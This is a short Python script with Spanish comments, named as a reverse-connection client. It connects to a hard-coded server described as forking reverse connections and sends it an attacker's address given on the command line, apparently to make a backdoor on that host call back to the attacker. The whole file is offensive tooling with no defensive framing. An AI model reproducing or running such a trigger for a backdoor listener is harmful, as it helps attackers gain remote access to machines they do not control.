# Echo Cliente
# Ejecutar : python revconn-cli.py direccion_atacante
import socket,sys

HOST = "1.2.3.4"    # Server forking reverse connections
PORT = 56789              # El puerto en que escucha el server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
attacker = sys.argv[1]
s.send(attacker)
s.close()
print('Reverse connection generated...')

